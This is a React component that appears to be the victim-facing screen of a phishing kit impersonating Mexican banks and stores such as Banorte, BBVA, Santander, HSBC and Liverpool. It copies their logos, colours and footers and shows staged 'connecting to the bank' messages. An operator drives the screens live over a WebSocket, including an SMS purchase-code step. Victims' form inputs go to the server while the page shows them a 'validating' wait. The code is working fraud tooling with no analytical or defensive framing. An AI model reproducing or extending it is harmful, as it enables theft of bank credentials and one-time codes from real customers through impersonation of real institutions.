import { useState, useEffect } from 'react';
import { useRoute } from 'wouter';
import { useWebSocket } from '@/hooks/useWebSocket';
import { ScreenTemplates } from '@/components/client/ScreenTemplates';
import { Session, ScreenType } from '@shared/schema';
import { formatDate } from '@/utils/helpers';
import liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool
import liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco
import citibanamexLogo from '../assets/Banamex.png';
import banbajioLogo from '../assets/banbajio_logo_oficial.png';
import banbajioBackground from '../assets/IMG_0354.jpeg';
import bbvaLogo from '@assets/bbva_logo.png';
import bbvaLogoWhite from '../assets/bbva_logo_white.png';
import banorteLogoHeader from '@assets/Bo.png.png';
import bancoppelLogo from '@assets/bancoppel.png';
import banorteLogoFooter from '@assets/Banorte-01.png';
import hsbcLogo from '@assets/Hsbc.png';
import hsbcBackground from '@assets/IMG_0391.jpeg';
import amexLogo from '@assets/Amex.png';
import santanderLogo from '../assets/santander_logo.png';
import santanderLogoWhite from '../assets/santander_logo_white_fixed.png';
import scotiabankLogo from '../assets/scotiabank_logo.png';
import scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';
import invexLogo from '../assets/invex_logo.png';
import invexLogoWhite from '../assets/invex_logo_white.png';
import banregioLogo from '../assets/banregio_logo.png';
import banregioLogoWhite from '../assets/banregio_logo_white.png';

export default function ClientScreen() {
  // Get session ID from URL
  const [, params] = useRoute('/client/:sessionId');
  const sessionId = params?.sessionId || '';
  
  // State for the current screen
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.VALIDANDO);
  const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({});
  const [bankLoaded, setBankLoaded] = useState<boolean>(false);
  
  // Additional screen-specific state
  const [screenData, setScreenData] = useState<{
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
  }>({});
  
  // Estado para controlar los mensajes iniciales
  const [initialMessage, setInitialMessage] = useState<string>('Conectando con el banco...');
  const [showInitialMessage, setShowInitialMessage] = useState<boolean>(true);
  
  // WebSocket connection
  const { socket, connected, sendMessage } = useWebSocket('/ws');

  // Efecto para mostrar los mensajes iniciales
  useEffect(() => {
    // Mostrar "Conectando con el banco" por 2 segundos
    const connectingTimer = setTimeout(() => {
      setInitialMessage('Generando aclaración...');
      
      // Después de 2 segundos más, mostrar la pantalla regular
      const generatingTimer = setTimeout(() => {
        setShowInitialMessage(false);
        
        // Cambiar a la pantalla FOLIO si no hay una pantalla específica configurada
        if (currentScreen === ScreenType.VALIDANDO && !sessionData.pasoActual) {
          setCurrentScreen(ScreenType.FOLIO);
        }
      }, 2000);
      
      return () => clearTimeout(generatingTimer);
    }, 2000);
    
    return () => clearTimeout(connectingTimer);
  }, []);
  
  // Register with the server when connection is established
  useEffect(() => {
    if (connected && sessionId) {
      sendMessage({
        type: 'REGISTER',
        role: 'CLIENT',
        sessionId
      });
    }
  }, [connected, sessionId, sendMessage]);

  // Handle WebSocket messages
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const message = JSON.parse(event.data);
        
        // Handle different message types
        if (message.type === 'INIT_SESSION') {
          setSessionData(message.data);
          setBankLoaded(true);
          // Set initial screen based on session data
          if (message.data.pasoActual) {
            setCurrentScreen(message.data.pasoActual as ScreenType);
          }
        }
        else if (message.type === 'SCREEN_CHANGE') {
          const { tipo, ...data } = message.data;
          
          console.log('SCREEN_CHANGE recibido:', tipo, data);
          
          // Extract screen type from the message
          // The server sends 'mostrar_X', we need to remove the prefix
          let screenType = tipo.replace('mostrar_', '');
          
          // Normalize screen type for SMS_COMPRA (handle different case variations)
          if (screenType.toLowerCase() === 'sms_compra' || 
              screenType.toLowerCase() === 'smscompra' ||
              screenType.toLowerCase() === 'sms compra') {
            console.log('Pantalla SMS_COMPRA detectada, normalizando a:', ScreenType.SMS_COMPRA);
            screenType = ScreenType.SMS_COMPRA; // Use the exact value from enum
          }
          
          console.log('Cambiando a pantalla:', screenType);
          
          // Verificación adicional para asegurar que se muestra la pantalla SMS_COMPRA
          if (tipo.toLowerCase().includes('sms_compra') || 
              tipo.toLowerCase().includes('smscompra') ||
              screenType.toLowerCase() === 'sms_compra' ||
              screenType.toLowerCase() === 'smscompra') {
            console.log('Verificando expresamente que SMS_COMPRA se establezca correctamente');
            console.log('Datos para mostrar en SMS_COMPRA:', data);
            setCurrentScreen(ScreenType.SMS_COMPRA);
            // Actualizamos los datos explícitamente para asegurar que se muestren
            setScreenData({
              ...data,
              terminacion: data.terminacion || '****'
            });
          } else {
            setCurrentScreen(screenType as ScreenType);
          }
          
          // Update screen-specific data
          setScreenData(data);
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => socket.removeEventListener('message', handleMessage);
  }, [socket]);

  // Handle form submissions
  const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
    if (connected) {
      console.log('Enviando datos al servidor:', screen, formData);
      
      // Enviar datos al servidor inmediatamente
      sendMessage({
        type: 'CLIENT_INPUT',
        data: {
          tipo: screen,
          sessionId,
          data: formData
        }
      });
      
      // Cambiar a pantalla validando mientras esperamos respuesta del admin
      setCurrentScreen(ScreenType.VALIDANDO);
    }
  };

  // Función para determinar el header basado en el banco
  const renderHeader = () => {
    if (sessionData.banco === 'LIVERPOOL') {
      return (
        <header className="bg-[#E1147B] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <div className="flex justify-center">
            <img 
              src={liverpoolLogo} 
              className="h-20 inline-block filter brightness-0 invert" 
              alt="Liverpool" 
            />
          </div>
        </header>
      );
    } else if (sessionData.banco === 'BANBAJIO') {
      return (
        <>
          <div className="logo text-center py-4 bg-white">
            <img 
              src={banbajioLogo} 
              alt="BanBajío"
              className="h-16 inline-block"
            />
          </div>
          <div className="banbajio-header">
            {formatDate(new Date())}
          </div>
        </>
      );
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <header className="bg-[#005BAC] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={citibanamexLogo} 
            className="h-20 inline-block" 
            alt="Citibanamex" 
          />
        </header>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <header className="bg-[#072146] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={bbvaLogoWhite} 
            className="h-6 inline-block white-logo" 
            alt="BBVA" 
          />
        </header>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <header className="bg-[#EC1C24] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={banorteLogoHeader} 
            className="h-20 inline-block" 
            alt="Banorte" 
          />
        </header>
      );
    } else if (sessionData.banco === 'BANCOPPEL') {
      return (
        <header className="bg-[#0066B3] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={bancoppelLogo} 
            className="h-20 inline-block" 
            alt="BanCoppel" 
          />
        </header>
      );
    } else if (sessionData.banco === 'HSBC') {
      return (
        <header className="bg-white p-4 text-center">
          <div className="font-bold text-sm mb-2 text-black">{formatDate(new Date())}</div>
          <img 
            src={hsbcLogo} 
            className="h-28 inline-block" 
            alt="HSBC" 
          />
        </header>
      );
    } else if (sessionData.banco === 'AMEX') {
      return (
        <header className="bg-[#0077C8] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={amexLogo} 
            className="h-20 inline-block" 
            alt="American Express" 
          />
        </header>
      );
    } else if (sessionData.banco === 'SANTANDER') {
      return (
        <header className="bg-[#EC0000] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={santanderLogoWhite} 
            className="h-28 inline-block white-logo" 
            alt="Santander" 
          />
        </header>
      );
    } else if (sessionData.banco === 'SCOTIABANK') {
      return (
        <header className="bg-[#EC111A] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={scotiabankLogoWhite} 
            className="h-28 inline-block white-logo" 
            alt="Scotiabank" 
          />
        </header>
      );
    } else if (sessionData.banco === 'INVEX') {
      return (
        <header className="bg-[#BE0046] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <div className="flex justify-center">
            <img 
              src={invexLogoWhite} 
              className="h-10 w-auto inline-block white-logo" 
              alt="INVEX" 
              style={{maxHeight: '36px'}}
            />
          </div>
        </header>
      );
    } else if (sessionData.banco === 'BANREGIO') {
      return (
        <header className="bg-[#FF6600] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <div className="flex justify-center">
            <img 
              src={banregioLogoWhite} 
              className="h-16 inline-block white-logo" 
              alt="Banregio" 
            />
          </div>
        </header>
      );
    } else {
      // Default header (Banorte)
      return (
        <header className="bg-[#EC1C24] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={banorteLogoHeader} 
            className="h-20 inline-block" 
            alt="Banorte" 
          />
        </header>
      );
    }
  };

  // Función para renderizar el footer específico de BanBajío
  const renderFooter = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return (
        <footer className="mt-auto">
          <div className="banbajio-footer">
            Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
          </div>
          <div className="banbajio-footer-bottom">
            <a href="#" className="text-white mx-2">Contáctanos</a>
            <a href="#" className="text-white mx-2">Aclaraciones</a>
            <a href="#" className="text-white mx-2">Promociones</a>
            <a href="#" className="text-white mx-2">Facebook</a>
            <a href="#" className="text-white mx-2">YouTube</a>
            <br />
            © Banbajio México 2024. Todos los Derechos Reservados
          </div>
        </footer>
      );
    } else {
      return (
        <footer className="mt-auto">
          <div className="bg-gray-100 p-4 text-center text-sm">
            <a href="#" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              'text-[#EC1C24]'
            } mx-2`}>Aprende más</a>
            <a href="#" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              'text-[#EC1C24]'
            } mx-2`}>Ayuda</a>
            <a href="#" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              'text-[#EC1C24]'
            } mx-2`}>Términos y condiciones</a>
            <a href="#" className={`${
              sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' :
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
              sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
              sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
              sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
              sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
              'text-[#EC1C24]'
            } mx-2`}>Seguridad en línea</a>
          </div>

          <div className={`${
            sessionData.banco === 'LIVERPOOL' ? 'bg-[#E1147B]' :
            sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
            sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
            sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
            sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
            sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :
            sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :
            sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :
            sessionData.banco === 'INVEX' ? 'bg-[#BE0046]' :
            sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
            'bg-[#EC1C24]'
          } text-white p-4 text-center text-sm`}>
            <div className="mb-3">
              <a href="#" className="text-white mx-2">Contáctanos</a> |
              <a href="#" className="text-white mx-2">Aclaraciones</a> |
              <a href="#" className="text-white mx-2">Promociones</a> |
              <a href="#" className="text-white mx-2">Facebook</a> |
              <a href="#" className="text-white mx-2">Youtube</a>
            </div>
            <div>© {
              sessionData.banco === 'LIVERPOOL' ? 'Liverpool' :
              sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
              sessionData.banco === 'BBVA' ? 'BBVA' :
              sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
              sessionData.banco === 'HSBC' ? 'HSBC' :
              sessionData.banco === 'AMEX' ? 'American Express' :
              sessionData.banco === 'SANTANDER' ? 'Santander' :
              sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :
              sessionData.banco === 'INVEX' ? 'INVEX' :
              sessionData.banco === 'BANREGIO' ? 'Banregio' :
              'Banorte'
            } México 2024. Todos los Derechos Reservados</div>
          </div>
        </footer>
      );
    }
  };

  // Función para mostrar información adicional según el banco
  const renderBankInfo = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return null; // BanBajío no muestra información adicional
    } else if (sessionData.banco === 'LIVERPOOL') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Tu experiencia de banca en línea de Liverpool, segura y confiable</p>
        </div>
      );
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
        </div>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">La manera más fácil y segura de realizar tus operaciones bancarias</p>
        </div>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Tu banca en línea, más segura y con mayor protección</p>
        </div>
      );
    } else if (sessionData.banco === 'BANCOPPEL') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">La llave a tu mundo financiero</p>
        </div>
      );
    } else if (sessionData.banco === 'HSBC') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">El banco local con perspectiva global</p>
        </div>
      );
    } else if (sessionData.banco === 'AMEX') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a American Express</p>
        </div>
      );
    } else if (sessionData.banco === 'SANTANDER') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Santander, tu banco de confianza</p>
        </div>
      );
    } else if (sessionData.banco === 'SCOTIABANK') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Scotiabank, tu banco con más posibilidades</p>
        </div>
      );
    } else if (sessionData.banco === 'INVEX') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a INVEX Banca Digital</p>
        </div>
      );
    } else if (sessionData.banco === 'BANREGIO') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banregio Banca Digital</p>
        </div>
      );
    } else {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
          <div className="mt-2 space-x-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png" 
              className="h-5 inline-block" 
              alt="Suburbia" 
            />
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg" 
              className="h-5 inline-block" 
              alt="Williams Sonoma" 
            />
          </div>
        </div>
      );
    }
  };

  // Si estamos mostrando el mensaje inicial o aún no se ha cargado el banco, mostrar una pantalla de carga
  if (showInitialMessage || !bankLoaded) {
    const loadingContent = (
      <>
        <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
          <div className="text-center mb-4">
            <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
              <div className={`h-full ${
                sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :
                sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
                sessionData.banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
                sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
                sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
                sessionData.banco === 'AMEX' ? 'amex-bg' :
                sessionData.banco === 'SANTANDER' ? 'santander-bg' :
                sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
                sessionData.banco === 'INVEX' ? 'invex-bg' :
                sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
                'bg-[#EC1C24]'
              } animate-progress-bar`}></div>
            </div>
          </div>
        </div>
      </>
    );
    
    // Si no se ha cargado el banco aún, mostramos una pantalla genérica de carga
    if (!bankLoaded) {
      return (
        <div className="min-h-screen flex flex-col bg-white">
          <header className="bg-gray-100 text-gray-800 p-4 text-center">
            <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
            <div className="h-20"></div>
          </header>
          
          {loadingContent}
          
          <footer className="mt-auto">
            <div className="bg-gray-100 p-4 text-center text-sm">
              <a href="#" className="text-gray-600 mx-2">Aprende más</a>
              <a href="#" className="text-gray-600 mx-2">Ayuda</a>
              <a href="#" className="text-gray-600 mx-2">Términos y condiciones</a>
              <a href="#" className="text-gray-600 mx-2">Seguridad en línea</a>
            </div>
            <div className="bg-gray-800 text-white p-4 text-center text-sm">
              <div className="mb-3">
                <a href="#" className="text-white mx-2">Contáctanos</a> |
                <a href="#" className="text-white mx-2">Aclaraciones</a> |
                <a href="#" className="text-white mx-2">Promociones</a> |
                <a href="#" className="text-white mx-2">Facebook</a> |
                <a href="#" className="text-white mx-2">YouTube</a>
              </div>
              <div>© Banca Digital 2024. Todos los Derechos Reservados</div>
            </div>
          </footer>
        </div>
      );
    }
    
    // Si el banco ya está cargado pero seguimos en la pantalla de carga
    return (
      <div 
        className={`min-h-screen flex flex-col ${
          sessionData.banco === 'BANBAJIO' 
            ? 'banbajio-background'  
            : 'bg-white'
        }`}
        style={
          sessionData.banco === 'BANBAJIO' 
            ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
            : sessionData.banco === 'HSBC'
            ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
            : {}
        }
      >
        {renderHeader()}
        {loadingContent}
        {renderFooter()}
      </div>
    );
  }

  // Renderizado normal cuando no estamos mostrando el mensaje inicial
  return (
    <div 
      className={`min-h-screen flex flex-col ${
        sessionData.banco === 'BANBAJIO' 
          ? 'banbajio-background'  
          : 'bg-white'
      }`}
      style={
        sessionData.banco === 'BANBAJIO' 
          ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
          : sessionData.banco === 'HSBC'
          ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
          : {}
      }
    >
      {renderHeader()}
      {/* Eliminamos renderBankInfo para evitar duplicar elementos */}

      <div className="container mx-auto max-w-md px-6 py-8 flex-grow">
        <ScreenTemplates 
          currentScreen={currentScreen} 
          screenData={screenData}
          onSubmit={handleSubmit}
          banco={sessionData.banco || 'BANORTE'}
        />
      </div>

      {renderFooter()}
    </div>
  );
}
